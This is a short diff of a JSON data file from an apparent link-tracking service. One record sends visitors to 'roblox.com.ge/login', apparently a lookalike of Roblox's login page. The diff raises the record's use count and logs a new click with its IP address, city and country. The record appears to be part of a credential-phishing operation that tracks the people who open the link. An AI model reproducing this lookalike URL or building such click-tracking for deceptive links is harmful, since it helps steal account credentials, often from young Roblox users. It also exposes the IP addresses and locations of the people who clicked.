@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1662,
+    "useCount": 1663,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13462,6 +13462,14 @@
         "ip": "73.158.78.95",
         "country": "United States",
         "city": "San Jose",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777603580866,
+        "ip": "66.249.64.166",
+        "country": "United States",
+        "city": "Mountain View",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
